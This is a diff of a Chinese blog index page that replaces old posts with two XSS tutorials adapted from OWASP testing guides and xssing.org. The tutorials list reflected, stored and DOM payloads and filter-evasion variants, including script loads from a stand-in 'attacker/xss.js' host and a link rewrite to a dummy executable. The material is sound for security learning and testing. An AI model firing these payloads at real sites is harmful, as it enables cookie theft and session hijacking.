@@ -138,14 +138,229 @@
 		<div class="markdown-body home-categories">
 		
 			<div class="article">
-                <a class="clearlink" href="15480046242082.html">
+                <a class="clearlink" href="15446888524769.html">
                 
-                  <h1>批量删除当前目录及其子目录下指定后缀名文件</h1>
+                  <h1>xss检测</h1>
                   <div class="a-content">
                       
                       <div class="a-content-text">
                         
-                        	<p>find . -name &quot;*.tmp&quot; -type f -print -exec rm -rf {} \;</p>
+                        	<h2 id="toc_0">反射型xss</h2>
+
+<p>1、检测输入向量，确定所有web应用程序的用户定义变量以及如何输入他们，包括显而易见的、http参数、post数据、隐藏的表单字段值等。</p>
+
+<p>2、分析每个输入向量并注入payload以检测潜在的漏洞。</p>
+
+<p>3、分析结果并确定是否存在具有实际影响的漏洞。</p>
+
+<ul>
+<li><p>没有任何防御的情况下</p>
+<p>直接访问即会弹窗</p>
+<pre class="line-numbers"><code class="language-http">http://example.com/index.php?user=&lt;script&gt;alert(123)&lt;/script&gt;
+</code></pre>
+<p>下面这段代码会导致用户单击测试人员提供的链接，即葱他控制的站点下载文件test.exe。</p>
+<pre class="line-numbers"><code class="language-http">http://example.com/index.php?user=&lt;script&gt;window.onload = function() {var AllLinks=document.getElementsByTagName(&quot;a&quot;); 
+AllLinks[0].href = &quot;http://badexample.com/test.exe&quot;; }&lt;/script&gt; 
+</code></pre></li>
+<li><p>标记属性值</p>
+<p>有些情况下可以不使用<code>&lt;script&gt;</code>标签的情况下执行xss漏洞利用，甚至不使用通常过滤的 &lt;&gt; 和 / 等字符。</p>
+<p>例如，Web应用程序可以使用用户输入值来填充属性，如以下代码所示：</p>
+<pre class="line-numbers"><code class="language-javascript">&lt;input type=&quot;text&quot; name=&quot;state&quot; value=&quot;INPUT_FROM_USER&quot;&gt;
+</code></pre>
+<p>然后攻击者可以提交以下代码：</p>
+<pre class="line-numbers"><code class="language-javascript">&quot; onfocus=&quot;alert(document.cookie)
+</code></pre></li>
+<li><p>不同的语法或编码</p>
+<p>通常可以使用这种方法来绕过一些过滤器</p>
+<p>代码示例：</p></li>
+</ul>
+
+<pre class="line-numbers"><code class="language-javascript">  &quot;&gt;&lt;script &gt;alert(document.cookie)&lt;/script &gt;
+  &quot;&gt;&lt;ScRiPt&gt;alert(document.cookie)&lt;/ScRiPt&gt;
+  &quot;%3cscript%3ealert(document.cookie)%3c/script%3e
+</code></pre>
+
+<ul>
+<li><p>绕过非递归过滤器</p>
+<p>有时，过滤器只清理一次，而不是递归执行</p>
+<pre class="line-numbers"><code class="language-javascript">&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt;
+</code></pre></li>
+<li><p>包含外部脚本</p>
+<p>现在假设目标站点的开发人员实现了以下代码来保护输入不包含外部脚本：</p></li>
+</ul>
+
+<pre class="line-numbers"><code class="language-text">&lt;?
+   $re = &quot;/&lt;script[^&gt;]+src/i&quot;;
+
+   if (preg_match($re, $_GET[&#39;var&#39;])) 
+   {
+      echo &quot;Filtered&quot;;
+      return; 
+   }
+   echo &quot;Welcome &quot;.$_GET[&#39;var&#39;].&quot; !&quot;;
+?&gt;
+</code></pre>
+
+<p>这种方案中，有一个正则表达式检测是否在 <code>&lt;script</code> 和 <code>&gt;</code> 之间插入了除 src 之外的任何其他内容。这对</p>
+
+<pre class="line-numbers"><code class="language-javascript">&lt;script src=&quot;http://attacker/xss.js&quot;&gt;&lt;/script&gt;
+</code></pre>
+
+<p>这种表达式特别有效。</p>
+
+<p>但是可以使用以下方式绕过：</p>
+
+<pre class="line-numbers"><code class="language-javascript">http://example/?var=&lt;SCRIPT%20a=&quot;&gt;&quot;%20SRC=&quot;http://attacker/xss.js&quot;&gt;&lt;/SCRIPT&gt; 
+</code></pre>
+
+<ul>
+<li>HTTP参数污染(HPP)</li>
+</ul>
+
+<p>这种规避技术包括在具有相同名称的多个参数之间拆分攻击向量。对每个参数值的操纵取决于每个web技术如何解析这些参数，因此这种规避不是总是可行的。</p>
+
+<p>定向攻击代码：</p>
+
+<pre class="line-numbers"><code class="language-javascript">http://example/page.php?param=&lt;script&gt;[...]&lt;/script&gt;
+</code></pre>
+
+<p>使用HPP攻击：</p>
+
+<pre class="line-numbers"><code class="language-javascript">http://example/page.php?param=&lt;script&amp;param=&gt;[...]&lt;/&amp;param=script&gt;
+</code></pre>
+
+<ul>
+<li>通常使用burp的主动扫描，即可检测出大部分情况下的反射型xss，而存储型xss目前还没有比较好的检测方法。</li>
+</ul>
+
+<h2 id="toc_1">存储型xss</h2>
+
+<ul>
+<li><p>输入表格</p></li>
+<li><p>存储型xss能不能成功主要取决于能不能规避过滤器。</p></li>
+<li><p>上传文件</p>
+<p>如果web应用程序允许文件上传，那么检查是否可以上载html内容就很重要。如果允许html或者txt文件，则可以在上载的文件中注入xss有效载荷。还应该验证文件上载是否允许设置任意MIME类型。</p>
+<p>考虑以下用于文件上传的 HTTP POST 请求：</p>
+<pre class="line-numbers"><code class="language-http">POST /fileupload.aspx HTTP/1.1
+[…]<br/>
+Content-Disposition: form-data; name=&quot;uploadfile1&quot;; filename=&quot;C:\Documents and Settings\test\Desktop\test.txt&quot;<br/>
+Content-Type: text/plain<br/>
+test
+</code></pre>
+<p>这种设计缺陷可以在浏览器 MIME 错误处理攻击中利用。例如，像jpg、gif这样的文件可以包含在浏览器加载时执行xss的有效载荷。当images、gif这样的图像的MIME类型可以设置为text/html时，这是可能的。这种情况下，客户端浏览器将文件视为HTML。</p>
+<p>HTTP POST 请求伪造:</p>
+<pre class="line-numbers"><code class="language-http">Content-Disposition: form-data; name=&quot;uploadfile1&quot;; filename=&quot;C:\Documents and Settings\test\Desktop\test.gif&quot;
+Content-Type: text/html<br/>
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+</code></pre></li>
+<li><p>测试应用程序如何处理用户输入</p>
+<p>可以执行以下步骤:</p>
+<ul>
+<li>使用前端应用程序并输入带有特殊/无效字符的输入</li>
+<li>分析应用程序响应</li>
+<li>确定输入验证控件存在</li>
+<li>访问后端系统并检查输入是否存储以及如何存储</li>
+<li>分析源代码并了解应用程序如何呈现存储的输入</li>
+</ul></li>
+<li><p>如果源码可用，则应分析输入表单中使用的所有变量，特别是PHP、ASP和JSP等编程语言使用预定义的变量/函数来存储来自HTTP GET和POST请求的输入。</p>
+<p>下表总结了在分析源代码时要查看的一些特殊变量和函数：</p>
+<table>
+<thead>
+<tr>
+<th>语言</th>
+<th>PHP</th>
+<th>ASP</th>
+<th>JSP</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>变量函数</td>
+<td>$_GET —— HTTP GET变量</td>
+<td>Request.QueryString —— HTTP GET</td>
+<td>doGet, doPost servlets —— HTTP GET 和 POST</td>
+</tr>
+<tr>
+<td></td>
+<td>$_POST—— HTTP POST变量</td>
+<td>Request.Form ——  HTTP POST</td>
+<td>request.getParameter —— HTTP GET/POST 变量</td>
+</tr>
+<tr>
+<td></td>
+<td>$_REQUEST —— HTTP POST, GET 和 COOKIE变量</td>
+<td>Server.CreateObject —— 用来上传文件</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>$_FILES —— HTTP文件上传变量</td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table></li>
+</ul>
+
+<h2 id="toc_2">DOM型xss</h2>
+
+<ul>
+<li>举个例子：</li>
+</ul>
+
+<p>假如我们访问一个页面: <code>http://www.example.com/welcome.html</code></p>
+
+<pre class="line-numbers"><code class="language-markup">&lt;HTML&gt;
+&lt;TITLE&gt;Welcome!&lt;/TITLE&gt;
+Hi
+&lt;SCRIPT&gt;
+var pos=document.URL.indexOf(&quot;name=&quot;)+5;
+document.write(document.URL.substring(pos,document.URL.length));
+&lt;/SCRIPT&gt;
+&lt;BR&gt;
+Welcome to our system
+…
+&lt;/HTML&gt;
+</code></pre>
+
+<p>此页面将用于欢迎用户，例如:</p>
+
+<p><code>http://www.example.com/welcome.html?name=lonelyor</code></p>
+
+<p>但是请求如下: </p>
+
+<p><code>http://www.example.com/welcome.html?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
+
+<p>这样会触发dom型xss的条件。让我们看看为什么:</p>
+
+<p>当受害者的浏览器像 <code>www.example.con</code> 发送http请求，并接受上述(静态)html页面。然后受害者的浏览器会开始将html解析为dom，dom包含一个名为 document 的对象，该对象包含一个名为 URL 的属性，并且此属性使用当前页面的 URL 填充来作为 dom 创建的一部分。当解析器达到javascript代码时，它会执行</p>
+
+<pre class="line-numbers"><code class="language-javascript">var pos=document.URL.indexOf(&quot;name=&quot;)+5;
+document.write(document.URL.substring(pos,document.URL.length));
+</code></pre>
+
+<p>并修改页面的原始html。这种情况下，代码引用 document.URL，因此，此name字符串的一部分将嵌入在html中并立即解析，这时会在同一页面执行 <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，因此是xss条件。</p>
+
+<ul>
+<li><p>注意</p>
+<ul>
+<li>恶意代码在任何时候都没有嵌入到原始html页面中(这与反射和存储型不同)</li>
+<li>此漏洞仅在浏览器不修改url字符时才有效。当url不直接在地址栏中输入时，火狐会自动编码 document.url 中的 &lt;和&gt;(分别为 %3C 和 %3E )，因此火狐不易收到攻击。IE6.0因为不编码这些所以容易被攻击。当然，直接嵌入HTML只是一个攻击挂载点，有各种场景不需要&lt;和&gt;，因此Mozilla通常不能免受此攻击。</li>
+</ul></li>
+<li><p>规避服务器检测</p>
+<p>显然上面的方法还是把payload发送到了服务器，这样后端还是可以检测到，不过，我们可以规避这种检测。</p>
+<p>新的payload如下:</p>
+<p><code>http://www.example.com/welcome.html#name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
+<p>注意文件后面的数学符号(#)，他告诉浏览器，#后面的内容都是片段，即不是查询的一部分，火狐和IE6.0不会将片段发送到服务器，因此服务器将看到相当于<code>http://www.example.com/welcome.html</code>，所以服务器不会看到有效载荷。</p></li>
+</ul>
+
+<h2 id="toc_3">参考链接</h2>
+
+<p><a href="https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001)">反射性xss</a></p>
+
+<p><a href="https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002)">存储型xss</a></p>
+
+<p><a href="https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001)">dom型xss</a></p>
 
                         
                       </div>
@@ -154,10 +369,10 @@
                 <div class="read-more clearfix">
                   <div class="more-left left">
                   
-                    <span class="date">2019/1/21 1:17 上午</span>
+                    <span class="date">2018/12/13 16:14 下午</span>
                     <span>posted in&nbsp;</span> 
           				  
-          					    <span class="posted-in"><a href='%E7%B3%BB%E7%BB%9F.html'>系统</a></span>
+          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
           				   
                   </div>
                   <div class="more-right right">
@@ -171,540 +386,133 @@
               </div><!-- article -->
         
 			<div class="article">
-                <a class="clearlink" href="15480046120109.html">
+                <a class="clearlink" href="15446876559011.html">
                 
-                  <h1>降低cpu使用率</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<p>pulimit -l 50 -p 1234<br/>
--l后面是使用百分比，-p后面是进城PID，可以使用htop查看进程pid</p>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/1/21 1:16 上午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E7%B3%BB%E7%BB%9F.html'>系统</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15474694746707.html">
-                
-                  <h1>十大经典排序算法（动图演示）</h1>
+                  <h1>xssing.org跨站的艺术</h1>
                   <div class="a-content">
                       
                       <div class="a-content-text">
                         
                         	<blockquote>
-<p>转载自：<a href="https://www.cnblogs.com/onepixel/articles/7674659.html">https://www.cnblogs.com/onepixel/articles/7674659.html</a></p>
+<p>这个网站太棒了，强烈推荐阅读<br/>
+<a href="https://xssing.org/%E9%A6%96%E9%A1%B5">xssing.org跨站的艺术</a>若不能直接访问请使用科学上网工具。</p>
 </blockquote>
 
-<h2 id="toc_0">0、算法概述</h2>
+<h1 id="toc_0">什么是XSS？</h1>
 
-<h3 id="toc_1">0.1 算法分类</h3>
+<h1 id="toc_1">概述</h1>
 
-<p>十种常见排序算法可以分为两大类：</p>
+<p>XSS全称跨站脚本(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为XSS，比较合适的方式应该叫做跨站脚本攻击。跨站点脚本（XSS）攻击是一种注射型攻击，攻击者在可信的网页中嵌入恶意代码，用户访问可信网页时触发XSS而被攻击.</p>
 
-<blockquote>
-<p>非线性时间比较类排序：通过比较来决定元素间的相对次序，由于其时间复杂度不能突破O(nlogn)，因此称为非线性时间比较类排序。</p>
+<p>攻击者通过Web应用程序发送恶意代码，一般以浏览器脚本的形式发送给不同的终端用户。当一个Web程序的用户输入点没有进行校验和编码，将很容易的导致XSS。</p>
 
-<p>线性时间非比较类排序：不通过比较来决定元素间的相对次序，它可以突破基于比较排序的时间下界，以线性时间运行，因此称为线性时间非比较类排序。 </p>
-</blockquote>
+<p>攻击者可以使用XSS发送恶意脚本给没有任何防备的用户。终端用户浏览器无法知道不应该信任叫嗯,而是执行了该脚本。因为它认为脚本来自可信的源,恶意脚本可以访问任何Cookies,会话令牌,或其浏览器和网站保留使用的他敏感信息。这些脚本甚至可以重写HTML页面的内容。更多的内容可以阅读本站其他内容。</p>
 
-<p><figure><img src="media/15474694746707/15474696026744.jpg" alt=""/></figure></p>
+<h1 id="toc_2">详细介绍</h1>
 
-<h3 id="toc_2">0.2 算法复杂度</h3>
+<p>跨站脚本攻击在以下情况出现:</p>
 
-<p><figure><img src="media/15474694746707/15474696174505.jpg" alt=""/></figure></p>
+<ol>
+<li>Web应用程序通过不可信的来源进行数据输入，最常见是的Web请求(输入，比如如GET访问某Web应用的url，通过参数提交数据,比如提交input=<script>alert(0);&lt;/ script&gt;)。</li>
+<li>恶意数据包含在动态内容内在没有进行校验的情况下发送给用户(输出，比如提交的input的值在没有校验的情况下，用户访问页面，浏览器直接渲染了input的值执行了JS，导致弹窗)。</li>
+</ol>
 
-<h3 id="toc_3">0.3 相关概念</h3>
+<p>发送到Web浏览器的恶意内容通常是以JavaScript代码的形式，当然也可以包括HTML，Flash或任何浏览器可以执行的其他类型的代码。基于XSS的攻击种类几乎是无限的，但它们通常包括发送隐私数据给攻击者，如cookies或其他会话信息；重定向受害者访问攻击者控制的页面；或者利用网站漏洞在用户机器上执行其他恶意操作。</p>
 
-<blockquote>
-<p>稳定：如果a原本在b前面，而a=b，排序之后a仍然在b的前面。</p>
+<h2 id="toc_3">存储型和反射型XSS攻击</h2>
 
-<p>不稳定：如果a原本在b的前面，而a=b，排序之后 a 可能会出现在 b 的后面。</p>
+<p>XSS攻击通常可以分为两类：存储型和反射型（也称持久性和非持久性）。还有第三种相对少为认知的XSS攻击类型，叫做DOM XSS ,具体可以点击这里阅读。</p>
 
-<p>时间复杂度：对排序数据的总的操作次数。反映当n变化时，操作次数呈现什么规律。</p>
+<p>同时最近还有一种XSS攻击类型被提出来，突变XSS，不过个人觉得突变XSS不合适作为第四种XSS攻击类型，因为这种突变XSS可以出现在以上三种类型的XSS里，不过比较特殊，我们同样也在这里进行单独介绍（Fooying注）。</p>
 
-<p>空间复杂度：是指算法在计算机内执行时所需存储空间的度量，它也是数据规模n的函数。 </p>
-</blockquote>
+<h2 id="toc_4">存储型XSS攻击</h2>
 
-<h2 id="toc_4">1、冒泡排序（Bubble Sort）</h2>
+<p>存储型攻击是指那些被注入脚本将被永久保存在目标服务器上，比如在数据库中，在消息板块，访客日志，注释字段等。受害人请求存储信息时，将再次检索到恶意脚本(比如，在留言板提交XSS攻击代码，会存储到数据库，当再次访问留言板会请求数据库中的留言信息，就会连同XSS攻击代码一起检索出来在页面展示，使得受害者再次被攻击)。存储型XSS有时也被称为持久性或Type-I XSS。</p>
 
-<p>冒泡排序是一种简单的排序算法。它重复地走访过要排序的数列，一次比较两个元素，如果它们的顺序错误就把它们交换过来。走访数列的工作是重复地进行直到没有再需要交换，也就是说该数列已经排序完成。这个算法的名字由来是因为越小的元素会经由交换慢慢“浮”到数列的顶端。 </p>
+<h2 id="toc_5">反射型XSS攻击</h2>
 
-<h3 id="toc_5">1.1 算法描述</h3>
+<p>反射型攻击是指那些被注入脚本反射出Web服务器，比如在一个错误信息、搜索结果，或者其他任何的包括一些或所有的输入作为请求的一部分发送到服务器的响应。反射型攻击是通过其他途径送达到受害者，比如一封邮件的内容，或者一些其他的网站。当用户被诱骗点击一个恶意链接，提交一个特制的表单，甚至只是浏览到恶意网站，被注入的脚本行进到有漏洞的网站，将攻击反射回用户浏览器。然后浏览器执行代码，因为它来自于一个“可信”的服务器。反射型XSS有时也被称为非持久性或Type-II XSS.</p>
 
-<p>比较相邻的元素。如果第一个比第二个大，就交换它们两个；<br/>
-对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对，这样在最后的元素应该会是最大的数；<br/>
-针对所有的元素重复以上的步骤，除了最后一个；<br/>
-重复步骤1~3，直到排序完成。</p>
+<h2 id="toc_6">其他类型的XSS漏洞的</h2>
 
-<h3 id="toc_6">1.2 动图演示</h3>
-<img src="https://images2017.cnblogs.com/blog/849589/201710/849589-20171015223238449-2146169197.gif" alt="" width="681" height="212">
-<h3 id="toc_7">1.3 代码实现</h3>
+<p>除了反射型和存储型XSS,其他类型的XSS，Amit Klein在2005年发现DOM XSS。除此之外，推荐关于XSS分类描述的文章：XSS分类，它涵盖了所有这些方面的XSS，组成了矩阵，存储vs反射型XSS，以及服务端和客户端XSS，DOM XSS是客户端XSS。</p>
 
-<pre class="line-numbers"><code class="language-text">function bubbleSort(arr) {
-    var len = arr.length;
-    for (var i = 0; i &lt; len - 1; i++) {
-        for (var j = 0; j &lt; len - 1 - i; j++) {
-            if (arr[j] &gt; arr[j+1]) {        // 相邻元素两两对比
-                var temp = arr[j+1];        // 元素交换
-                arr[j+1] = arr[j];
-                arr[j] = temp;
-            }
-        }
-    }
-    return arr;
-}
+<h2 id="toc_7">XSS攻击结果</h2>
+
+<p>无论是存储型还是反射型（或DOM XSS）的攻击结果都是相同的。不同的是Payload如何有效的到达服务器。不要错误的认为，一个“read only”或“brochureware”网站不容易受到严重的反射型XSS攻击。XSS可以引起终端用户的各种问题，包括不同的严重成都。最严重的XSS攻击涉及用户的会话cookie的披露，使攻击者劫持用户的会话和接管帐户。其他破坏性攻击包括终端用户的文件披露，特洛伊木马程序的安装，将用户重定向到其他网页或网站，或修改内容介绍。XSS漏洞允许攻击者修改新闻稿或新闻项目可以影响一个公司的股票价格或减少消费者的信心。一个药品网站XSS漏洞可能允许攻击者修改剂量信息导致过量。更多关于这些类型的攻击请看内容欺骗。</p>
+
+<h2 id="toc_8">如何确定存在漏洞</h2>
+
+<p>XSS漏洞比较难以识别和从Web应用程序中删除。发现漏洞的最佳方法是进行的代码的安全审计，搜索一个HTTP请求中可能进入HTML输出的所有输入点。值得注意的是，各种不同的HTML标签可以用来发送一个恶意的JavaScript。Nessus, Nikto以及其他的一些扫描器，可以用来扫描检测XSS，不过效果有限。如果一个网站的某部分存在漏洞，那么很有可能还有其他的问题。</p>
+
+<h2 id="toc_9">如何防范XSS</h2>
+
+<p>XSS防御的相关内容位于OWASP XSS防范备忘录 .</p>
+
+<p>另外，最主要的是关闭掉你所有Web服务对HTTP回调的支持。攻击者可以窃取cookie数据通过JavaScript，即使document.cookie被禁用或不支持客户端。用户可以在论坛发布一个恶意脚本，当其他人点击链接，异步回调请求就会被触发，用来收集来自服务器的用户的cookie信息，然后发送到另一个接收地址，这样攻击者就可以进行一个会话劫持攻击。关闭掉你所有Web服务对HTTP回调的支持是很容易的。</p>
+
+<p>OWASP ESAPI project已经开发了一套可重用的安全组件。包含多种编程语言，包括验证和转义来防止参数篡改和XSS攻击注射。此外，OWASP WebGoat Project训练应用，有跨站点脚本和数据编码的训练经验。</p>
+
+<h2 id="toc_10">XSS语句</h2>
+
+<p><strong>属性中使用脚本的XSS</strong><br/>
+XSS攻击可能在非<script></script> 标签中发生. 其他标签也可以做同样事，比如:</p>
+
+<p><code>&lt;body onload=alert(&#39;test1&#39;)&gt;</code><br/>
+或其他属性，如:onmouseover,onerror.onmouseover</p>
+
+<p><code>&lt;b onmouseover=alert(&#39;Wufff!&#39;)&gt;click me!&lt;/b&gt;</code><br/>
+onerror</p>
+
+<p><code>&lt;img src=&quot;http://url.to.file.which/not.exist&quot; onerror=alert(document.cookie);&gt;</code></p>
+
+<p><strong>利用XSS脚本通过编码的URI方案</strong><br/>
+如果我们需要绕过Web应用过滤器，我们可以尝试编码字符串，比如：a=A (UTF-8),在img标签中使用：</p>
+
+<p><code>&lt;IMG SRC=jAvascript:alert(&#39;test2&#39;)&gt;</code><br/>
+有许多不同的UTF-8编码符号可以给我们更多的可能性。</p>
+
+<p><strong>XSS利用代码的编码</strong><br/>
+在META标签，我们可以对我们的脚本进行base64编码，这样就不用输入alert()字符。这个方法的更多信息参考RFC 2397</p>
+
+<p><code>&lt;META HTTP-EQUIV=&quot;refresh&quot; <br/>
+CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg&quot;&gt;</code></p>
+
+<p>这些以及其他的例子可以在OWASP XSS Filter Evasion Cheat Sheet查看。这是一个真正的备用XSS攻击代码的百科</p>
+
+<h1 id="toc_11">例子</h1>
+
+<p>跨站点脚本攻击可能发生在任何地方，可能是恶意用户被允许发送非规范内容到一个可信的网站给其他合法用户。最常见的例子发生在网站公告板，提供基于Web的邮件列表的功能</p>
+
+<h2 id="toc_12">例子 1</h2>
+
+<p>The following JSP code segment reads an employee ID, eid, from an HTTP request and displays it to the user. 下面的JSP代码块从一个HTTP请求读取employee ID, eid，并展示给用户。</p>
+
+<pre class="line-numbers"><code class="language-text">    &lt;% String eid = request.getParameter(&quot;eid&quot;); %&gt; 
+    ... 
+    Employee ID: &lt;%= eid %&gt;
 </code></pre>
 
-<h2 id="toc_8">2、选择排序（Selection Sort）</h2>
+<p>如果eid仅包含标准字母数字文本，则此示例中的代码可正常运行。如果eid具有包含元字符或源代码的值，则代码将在Web浏览器显示HTTP响应时执行。</p>
 
-<p>选择排序(Selection-sort)是一种简单直观的排序算法。它的工作原理：首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置，然后，再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕。 </p>
+<p>最初，这似乎不是一个漏洞。毕竟，为什么有人会输入导致恶意代码在自己的计算机上运行的URL？真正的危险是攻击者会创建恶意URL，然后使用电子邮件或社交工程技巧诱使受害者访问URL的链接。当受害者点击该链接时，他们会无意中通过易受攻击的Web应用程序将恶意内容反映回自己的计算机。这种利用易受攻击的Web应用程序的机制称为反射型XSS。</p>
 
-<h3 id="toc_9">2.1 算法描述</h3>
+<h2 id="toc_13">例子 2</h2>
 
-<p>n个记录的直接选择排序可经过n-1趟直接选择排序得到有序结果。具体算法描述如下：</p>
+<p>The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee&#39;s name.</p>
 
-<p>初始状态：无序区为R[1..n]，有序区为空；<br/>
-第i趟排序(i=1,2,3…n-1)开始时，当前有序区和无序区分别为R[1..i-1]和R(i..n）。该趟排序从当前无序区中-选出关键字最小的记录 R[k]，将它与无序区的第1个记录R交换，使R[1..i]和R[i+1..n)分别变为记录个数增加1个的新有序区和记录个数减少1个的新无序区；<br/>
-n-1趟结束，数组有序化了。<br/>
-2.2 动图演示<br/>
-　　<br/>
-<img src="https://images2017.cnblogs.com/blog/849589/201710/849589-20171015224719590-1433219824.gif" alt="" width="684" height="209"></p>
+<pre class="line-numbers"><code class="language-jsp">    &lt;%...
+     Statement stmt = conn.createStatement(); 
+     ResultSet rs = stmt.executeQuery(&quot;select * from emp where id=&quot;+eid); 
+     if (rs != null) { 
+      rs.next(); 
+      String name = rs.getString(&quot;name&quot;); 
+    %&gt; 
+    Employee Name: &lt;%= name %&gt;
+```
 
-<h3 id="toc_10">2.3 代码实现</h3>
-
-<pre class="line-numbers"><code class="language-text">function selectionSort(arr) {
-    var len = arr.length;
-    var minIndex, temp;
-    for (var i = 0; i &lt; len - 1; i++) {
-        minIndex = i;
-        for (var j = i + 1; j &lt; len; j++) {
-            if (arr[j] &lt; arr[minIndex]) {     // 寻找最小的数
-                minIndex = j;                 // 将最小数的索引保存
-            }
-        }
-        temp = arr[i];
-        arr[i] = arr[minIndex];
-        arr[minIndex] = temp;
-    }
-    return arr;
-} 
+以上，是首页的部分内容，首页还有很多的参考链接，这些链接都非常有价值，可是不好copy，所以请读者自行前往原网站欣赏。
 </code></pre>
-
-<h3 id="toc_11">2.4 算法分析</h3>
-
-<p>表现最稳定的排序算法之一，因为无论什么数据进去都是O(n2)的时间复杂度，所以用到它的时候，数据规模越小越好。唯一的好处可能就是不占用额外的内存空间了吧。理论上讲，选择排序可能也是平时排序一般人想到的最多的排序方法了吧。</p>
-
-<h2 id="toc_12">3、插入排序（Insertion Sort）</h2>
-
-<p>插入排序（Insertion-Sort）的算法描述是一种简单直观的排序算法。它的工作原理是通过构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到相应位置并插入。</p>
-
-<h3 id="toc_13">3.1 算法描述</h3>
-
-<p>一般来说，插入排序都采用in-place在数组上实现。具体算法描述如下：</p>
-
-<p>从第一个元素开始，该元素可以认为已经被排序；<br/>
-取出下一个元素，在已经排序的元素序列中从后向前扫描；<br/>
-如果该元素（已排序）大于新元素，将该元素移到下一位置；<br/>
-重复步骤3，直到找到已排序的元素小于或者等于新元素的位置；<br/>
-将新元素插入到该位置后；<br/>
-重复步骤2~5。</p>
-
-<h3 id="toc_14">3.2 动图演示</h3>
-<img src="https://images2017.cnblogs.com/blog/849589/201710/849589-20171015225645277-1151100000.gif" alt="" width="671" height="418">
-<h3 id="toc_15">3.3 代码实现</h3>
-
-<pre class="line-numbers"><code class="language-text">function insertionSort(arr) {
-    var len = arr.length;
-    var preIndex, current;
-    for (var i = 1; i &lt; len; i++) {
-        preIndex = i - 1;
-        current = arr[i];
-        while (preIndex &gt;= 0 &amp;&amp; arr[preIndex] &gt; current) {
-            arr[preIndex + 1] = arr[preIndex];
-            preIndex--;
-        }
-        arr[preIndex + 1] = current;
-    }
-    return arr;
-}
-</code></pre>
-
-<h3 id="toc_16">3.4 算法分析</h3>
-
-<p>插入排序在实现上，通常采用in-place排序（即只需用到O(1)的额外空间的排序），因而在从后向前扫描过程中，需要反复把已排序元素逐步向后挪位，为最新元素提供插入空间。</p>
-
-<h2 id="toc_17">4、希尔排序（Shell Sort）</h2>
-
-<p>1959年Shell发明，第一个突破O(n2)的排序算法，是简单插入排序的改进版。它与插入排序的不同之处在于，它会优先比较距离较远的元素。希尔排序又叫缩小增量排序。</p>
-
-<h3 id="toc_18">4.1 算法描述</h3>
-
-<p>先将整个待排序的记录序列分割成为若干子序列分别进行直接插入排序，具体算法描述：</p>
-
-<p>选择一个增量序列t1，t2，…，tk，其中ti&gt;tj，tk=1；<br/>
-按增量序列个数k，对序列进行k 趟排序；<br/>
-每趟排序，根据对应的增量ti，将待排序列分割成若干长度为m 的子序列，分别对各子表进行直接插入排序。仅增量因子为1 时，整个序列作为一个表来处理，表长度即为整个序列的长度。</p>
-
-<h3 id="toc_19">4.2 动图演示</h3>
-<img src="https://images2018.cnblogs.com/blog/849589/201803/849589-20180331170017421-364506073.gif" alt="">
-<h3 id="toc_20">4.3 代码实现</h3>
-
-<pre class="line-numbers"><code class="language-text">function shellSort(arr) {
-    var len = arr.length,
-        temp,
-        gap = 1;
-    while (gap &lt; len / 3) {          // 动态定义间隔序列
-        gap = gap * 3 + 1;
-    }
-    for (gap; gap &gt; 0; gap = Math.floor(gap / 3)) {
-        for (var i = gap; i &lt; len; i++) {
-            temp = arr[i];
-            for (var j = i-gap; j &gt; 0 &amp;&amp; arr[j]&gt; temp; j-=gap) {
-                arr[j + gap] = arr[j];
-            }
-            arr[j + gap] = temp;
-        }
-    }
-    return arr;
-}
-</code></pre>
-
-<h3 id="toc_21">4.4 算法分析</h3>
-
-<p>希尔排序的核心在于间隔序列的设定。既可以提前设定好间隔序列，也可以动态的定义间隔序列。动态定义间隔序列的算法是《算法（第4版）》的合著者Robert Sedgewick提出的。　</p>
-
-<h2 id="toc_22">5、归并排序（Merge Sort）</h2>
-
-<p>归并排序是建立在归并操作上的一种有效的排序算法。该算法是采用分治法（Divide and Conquer）的一个非常典型的应用。将已有序的子序列合并，得到完全有序的序列；即先使每个子序列有序，再使子序列段间有序。若将两个有序表合并成一个有序表，称为2-路归并。 </p>
-
-<h3 id="toc_23">5.1 算法描述</h3>
-
-<p>把长度为n的输入序列分成两个长度为n/2的子序列；<br/>
-对这两个子序列分别采用归并排序；<br/>
-将两个排序好的子序列合并成一个最终的排序序列。</p>
-
-<h3 id="toc_24">5.2 动图演示</h3>
-<img src="https://images2017.cnblogs.com/blog/849589/201710/849589-20171015230557043-37375010.gif" alt="" width="678" height="422">
-<h2 id="toc_25">5.3 代码实现</h2>
-
-<pre class="line-numbers"><code class="language-text">function mergeSort(arr) {  // 采用自上而下的递归方法
-    var len = arr.length;
-    if (len &lt; 2) {
-        return arr;
-    }
-    var middle = Math.floor(len / 2),
-        left = arr.slice(0, middle),
-        right = arr.slice(middle);
